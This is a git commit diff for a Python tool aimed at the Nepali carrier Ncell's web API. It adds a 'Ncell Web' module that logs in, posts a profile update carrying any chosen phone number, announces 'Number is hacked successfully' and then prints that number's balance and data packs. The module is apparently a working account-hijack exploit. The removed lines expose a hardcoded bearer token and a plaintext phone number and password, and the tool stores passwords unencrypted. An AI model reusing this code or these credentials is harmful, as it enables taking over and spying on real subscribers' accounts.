30764fdfa6a51837e18e3c9e010b6aff36d8f4d9
Santosh kurmi <xantosh121@gmail.com>
2022-06-14 13:39:44 +0545

    first comita

--- ncellpy.py
+++ ncellpy.py
@@ -962,6 +962,7 @@ def login():
     account=accounts(1);
     phone1=takeInput(bcolors.OKBLUE+"Enter number or choose from above: ");
     if phone1=="b":return
+    elif phone1=="e":exit()
     try:
         length=len(account)
     except:length=-1
@@ -986,6 +987,8 @@ def login():
 
     if response[0]==200:
         otp=takeInput(bcolors.WARNING+"Enter the otp: ");
+        if otp=="b":return
+        elif otp=="e":exit()
         if len(otp)>4:
             body={
              "0":"validateOTPRequest","1": {
@@ -1013,6 +1016,7 @@ def sendsms():
     global phone
     sender=takeInput(bcolors.FAIL+"Enter the sender number(m): ");
     receiver=takeInput(bcolors.ENDC+"Enter the receiver number(m): ");
+
     if sender=="m":sender=phone
     if receiver=="m":receiver=phone
     msg="1";
@@ -1051,7 +1055,10 @@ def sendsms():
 def subuns(action=""):
     code=[5005024,5002848,5007729,5002846];
     offer=takeInput(bcolors.WARNING+"1. 200 mb free data\n2. 1 gb free data\n3. 2gb at Rs.50 28 days\n4. 200 Min at Rs.45 7 days\n=> ");
+    if offer=="b":return
+    elif offer=="e":exit()
     if offer!="":
+    
         if offer=="2":
             print("Service Not Available");
             return
@@ -1071,6 +1078,8 @@ def giftSend():
     global phone
     codeArray=queryGift();
     gift=takeInput(bcolors.HEADER+"Enter the choice to perform: ");
+    if gift=="b":return
+    elif gift=="e":exit()
     if gift!="":
         if int(gift)<=len(codeArray):
             gift=codeArray[int(gift)];
@@ -1169,6 +1178,8 @@ def balance():
 def verOtp():
     global subid;
     otpp=takeInput("Enter the otp: ");
+    if otpp=="b":return
+    elif otpp=="e":exit()
     
     url="accountmgt/otp/validate";
     body={"0":"validateOTPRequest",
@@ -1387,17 +1398,190 @@ def logouti():
           os.rename("data.json","data.json.bak");
           print("You are logout..");
           exit();
+      
 
-def logout():
-    print("Hey");
+######################################################ncell web
+def getheader():
+    headerweb={
+"Host": "webapi.ncell.axiata.com",
+"Authorization": token,
+"Content-Type": "application/json;charset=UTF-8",
+"Accept": "application/json, text/plain, */*"
+        }
+
+    return headerweb
+
+
+
+def getdata():
+    global phone2
+
+    data={
+        "email":"sagar@gmail.com",
+        "first_name":"Sagar",
+        "last_name":"thapa",
+        "date_of_birth":"12/10/2000",
+        "phone_number":phone2
+        }
+    return data
+
+def getsend():
+    url="https://webapi.ncell.axiata.com/v1/account/dashboard";
+    response=requests.get(url,headers=getheader()).json();
+    return response["data"]
+
+def postsend():
+    global phone2
+    
+    url="https://webapi.ncell.axiata.com/v1/account/update-profile";
+    data=json.dumps(getdata());
+    
+    response=requests.post(url,data=data,headers=getheader()).json()
+    
+    if response["message"]=="Information updated successfully.":
+        readwrite1(1);
+        print(f"\n{c()}Number is hacked successfully\n")
+    
+    else:
+        if response["message"]=="Unauthenticated.":
+            print(f"\n{c()}Please login here\n")
+            return 10
+        print()
+        print(f'{c()}{response["message"]}')
+        print()
+        return 12
+
+def weblogin(mode=0):
+    global token,phone2,default,password2;
+    hhhh = {
+"Host": "webapi.ncell.axiata.com",
+"Authorization":"Bearer "+gettoken() ,
+"Content-Type": "application/json;charset=UTF-8",
+"Accept": "application/json, text/plain, */*"
+        }
+    url="https://webapi.ncell.axiata.com/v1/account/login/request"
+    if mode==0:
+        phone2=input("Enter the phone: ");
+        if not  len(phone2)==10:
+            exit();
+        password1 = input("Enter the password: " );
+    if mode==1:
+        password1 = password2;
         
+    data =json.dumps({
+  "phoneNumber":phone2,
+  "password": password1,
+  "redirectTo": " ",
+  "url":"/v1/account/login/request"
+        })
+    response =requests.post(url,headers=hhhh,data=data).json();
+    code = response["message"];
+    if code=="OK":
+        token ="Bearer "+response["data"]["token"]
+        if mode==0:
+            default =phone2
+        password2= password1
+        readwrite1(1);
+        print(f"\n{c()}Login successfull\n")
+    else:
+        print(code);
+    
+
+def gettoken():
+    url ="https://www.ncell.axiata.com"+"/en/auth/login";
+    header={
+"Host": "webapi.ncell.axiata.com"
+        }
+    
+    response = requests.get(url);
+    return response.cookies["ncell_website"]
+    # print(response.text)
+
+def printerweb():
+    
+    response=getsend()
+    print(f"\n{c()}phone: {phone2}")
+    balance= response["balanceInfo"]["currentBalance"]
+    counter=2
+    print(f"\n{c()}1. Balance: {balance}\n") 
+    for key in response["packInfo"]:
+        types=gettype(key)
+        for json in response["packInfo"][key]:
+            print(f"{c()}{counter}. {json['title_en']}"  )
+            if key=="voicePack":
+                print(f"{c()}Remaining: {json['remaining']/60}/{json['total']/60} {types}" )
+            else:
+                print(f"{c()}Remaining: {json['remaining']}/{json['total']} {types}" )
+            print(f"{c()}Validity:{ json['validity']}\n")
+            counter+=1
+
+def gettype(key):
+    types={"dataPack":"MB","voicePack":"Min","smsPack":"SMS"}
+    return types[key]
+
+
+
+def readwrite1( mode=0):
+    global token,phone2,default,password2;
+    if mode==0:
+        if not os.path.exists("ncellweb.json"):
+            with open("ncellweb.json","w")as fp:
+                fp.write('{"phone":"","token":"","default":"","password":""}');
+
+        else:
+            with open("ncellweb.json") as fp:
+                data = json.loads(fp.read());
+                phone2 = data["phone"]
+                token =data["token"]
+                default=data["default"]
+                password2 = data["password"]
+    elif mode==1:
+        with open("ncellweb.json","w") as writef:
+            data ={"phone":phone2,"token":token,"default":default,"password":password2}
+            
+            data1=json.dumps(data,indent=4);
+            writef.write(data1)
+            
+
+
+def setdefault():
+    global phone2,default;
+    readwrite1();
+    # weblogin(1)
+    temp = phone2 
+    phone2 = default
+    postsend();
+    phone2 = temp
+
+# weblogin() #login with password manually
+readwrite1(); #entry point here
+
+def webaxiata():
+    while True:
+    
+        aa=input(f"{c()}1. Login\n{c()}2. AutoLogin\n{c()}3. Set Default\n{c()}4. Print\n{c()}=>");
+        if aa=="b":
+            break;
+        elif aa=="e":
+            exit();
+        elif aa=="4":printerweb();
+        elif int(aa)==1:
+            weblogin();
+        elif int(aa)==2:weblogin(1);
+        elif int(aa)==3:setdefault();
+        elif len(aa)==10:
+            phone2=aa;
+            res=postsend()
+            if not res ==12 and not res==10:printerweb()
+            if res==10:weblogin()
+        input(f"{c()}Press enter to show menu: ")
+        
+            
 
 
 
 
-
-
-
+#end of ncell web
 #starting the whole process
 
 def app():
@@ -1459,8 +1643,9 @@ def web():
 
 while(True):
 
-    choose=take(f"{c()}1. Ncell Ecare\n{c()}2. Ncell App\n{c()}=>");
+    choose=take(f"{c()}1. Ncell Ecare\n{c()}2. Ncell App{c()}\n3. Ncell Web\n{c()}4. Update\n{c()}=>");
     if choose=="b":break;
     if int(choose)==1:web();
     elif int(choose)==2:app();
-    elif int(choose)==3:update(repo,"ncellpy");
+    elif int(choose)==4:update(repo,"ncellpy");
+    elif int(choose)==3:webaxiata();
--- ncellweb.py
+++ ncellweb.py
@@ -1,91 +1,185 @@
 import requests
 import json
-token="";phone="";password="";
-headerweb={
+import os
+token="";phone2="";password1="";password2="";
+host="";
+import random
+
+def c():
+    return f"\u001b[{random.randint(30,37)};1m";
+
+def getheader():
+    headerweb={
 "Host": "webapi.ncell.axiata.com",
-"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY1NTA5NTQ5MywibmJmIjoxNjU1MDk1NDkzLCJleHAiOjE2NTUwOTkwOTMsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6Im5jZWxsX3B3YSJ9.FKbL7QEF1cpQBm8N8A1bGwfvnX1ako9scMbFX_sk7q8",
+"Authorization": token,
 "Content-Type": "application/json;charset=UTF-8",
 "Accept": "application/json, text/plain, */*"
         }
-host="https://webapi.ncell.axiata.com";
 
-def getbody(key):
-    body={
-        "login":
-        {
-  "phoneNumber": "9824486107",
-  "password": "Duffer123",
-  "redirectTo": Null,
-  "url":"/v1/account/login/request"
-        },
-            }
+    return headerweb
+
+
+
 def getdata():
-    global phone
+    global phone2
 
     data={
-        "email":"susma@gmail.com",
-        "first_name":"Susma",
-        "last_name":"susma",
-        "date_of_birth":"12/10/2022",
-        "phone_number":phone
+        "email":"sagar@gmail.com",
+        "first_name":"Sagar",
+        "last_name":"thapa",
+        "date_of_birth":"12/10/2000",
+        "phone_number":phone2
         }
     return data
 
 def getsend():
-    url=host+"/v1/account/dashboard";
-    response=requests.get(url,headers=headerweb).json();
+    url="https://webapi.ncell.axiata.com/v1/account/dashboard";
+    response=requests.get(url,headers=getheader()).json();
     return response["data"]
 
 def postsend():
-    url=host+"/v1/account/update-profile";
+    global phone2
+    
+    url="https://webapi.ncell.axiata.com/v1/account/update-profile";
     data=json.dumps(getdata());
-    response=requests.post(url,data=data,headers=headerweb).json()
-    print()
-    print(response["message"])
-    print()
+    
+    response=requests.post(url,data=data,headers=getheader()).json()
+    
+    if response["message"]=="Information updated successfully.":
+        readwrite1(1);
+        print(f"\n{c()}Number is hacked successfully\n")
+    
+    else:
+        if response["message"]=="Unauthenticated.":
+            print(f"\n{c()}Please login here\n")
+            return 10
+        print()
+        print(f'{c()}{response["message"]}')
+        print()
+        return 12
 
-def weblogin():
-    url=host + "/v1/account/login/request"
-    phone=input("Enter the phone: ");
-    if not  len(phone)==10:
-        exit();
-    password = input("Enter the password: " );
+def weblogin(mode=0):
+    global token,phone2,default,password2;
+    hhhh = {
+"Host": "webapi.ncell.axiata.com",
+"Authorization":"Bearer "+gettoken() ,
+"Content-Type": "application/json;charset=UTF-8",
+"Accept": "application/json, text/plain, */*"
+        }
+    url="https://webapi.ncell.axiata.com/v1/account/login/request"
+    if mode==0:
+        phone2=input("Enter the phone: ");
+        if not  len(phone2)==10:
+            exit();
+        password1 = input("Enter the password: " );
+    if mode==1:
+        password1 = password2;
+        
     data =json.dumps({
-  "phoneNumber":phone,
-  "password": password,
+  "phoneNumber":phone2,
+  "password": password1,
   "redirectTo": " ",
   "url":"/v1/account/login/request"
         })
-    response =requests.post(url,headers=headerweb,data=data).json();
-    print(response);
+    response =requests.post(url,headers=hhhh,data=data).json();
+    code = response["message"];
+    if code=="OK":
+        token ="Bearer "+response["data"]["token"]
+        if mode==0:
+            default =phone2
+        password2= password1
+        readwrite1(1);
+        print(f"\n{c()}Login successfull\n")
+    else:
+        print(code);
+    
 
+def gettoken():
+    url ="https://www.ncell.axiata.com"+"/en/auth/login";
+    header={
+"Host": "webapi.ncell.axiata.com"
+        }
+    
+    response = requests.get(url);
+    return response.cookies["ncell_website"]
+    # print(response.text)
 
 def printerweb():
     
     response=getsend()
+    print(f"\n{c()}phone: {phone2}")
     balance= response["balanceInfo"]["currentBalance"]
     counter=2
-    print(f"\n1. Balance: {balance}\n") 
+    print(f"\n{c()}1. Balance: {balance}\n") 
     for key in response["packInfo"]:
         types=gettype(key)
         for json in response["packInfo"][key]:
-            print(f"{counter}. {json['title_en']}"  )
+            print(f"{c()}{counter}. {json['title_en']}"  )
             if key=="voicePack":
-                print(f"Remaining: {json['remaining']/60}/{json['total']/60} {types}" )
+                print(f"{c()}Remaining: {json['remaining']/60}/{json['total']/60} {types}" )
             else:
-                print(f"Remaining: {json['remaining']}/{json['total']} {types}" )
-            print(f"Validity:{ json['validity']}\n")
+                print(f"{c()}Remaining: {json['remaining']}/{json['total']} {types}" )
+            print(f"{c()}Validity:{ json['validity']}\n")
             counter+=1
 
 def gettype(key):
     types={"dataPack":"MB","voicePack":"Min","smsPack":"SMS"}
     return types[key]
 
-weblogin()
-while True:
-    phone=input("Enter the phone: ");
-    if len(phone)==10:
-        postsend()
-        printerweb()
-    else:
-        printerweb();
+
+
+def readwrite1( mode=0):
+    global token,phone2,default,password2;
+    if mode==0:
+        if not os.path.exists("ncellweb.json"):
+            with open("ncellweb.json","w")as fp:
+                fp.write('{"phone":"","token":"","default":"","password":""}');
+
+        else:
+            with open("ncellweb.json") as fp:
+                data = json.loads(fp.read());
+                phone2 = data["phone"]
+                token =data["token"]
+                default=data["default"]
+                password2 = data["password"]
+    elif mode==1:
+        with open("ncellweb.json","w") as writef:
+            data ={"phone":phone2,"token":token,"default":default,"password":password2}
+            
+            data1=json.dumps(data,indent=4);
+            writef.write(data1)
+            
+
+
+def setdefault():
+    global phone2,default;
+    readwrite1();
+    # weblogin(1)
+    temp = phone2 
+    phone2 = default
+    postsend();
+    phone2 = temp
+
+# weblogin() #login with password manually
+readwrite1(); #entry point here
+def webaxiata():
+    while True:
+    
+        aa=input(f"{c()}1. Login\n{c()}2. AutoLogin\n{c()}3. Set Default\n{c()}4. Print\n{c()}=>");
+        if aa=="b":
+            break;
+        elif aa=="e":
+            exit();
+        elif aa=="4":printerweb();
+        elif int(aa)==1:
+            weblogin();
+        elif int(aa)==2:weblogin(1);
+        elif int(aa)==3:setdefault();
+        elif len(aa)==10:
+            phone2=aa;
+            res=postsend()
+            if not res ==12 and not res==10:printerweb()
+            if res==10:weblogin()
+        input(f"{c()}Press enter to show menu: ")
+        
+            
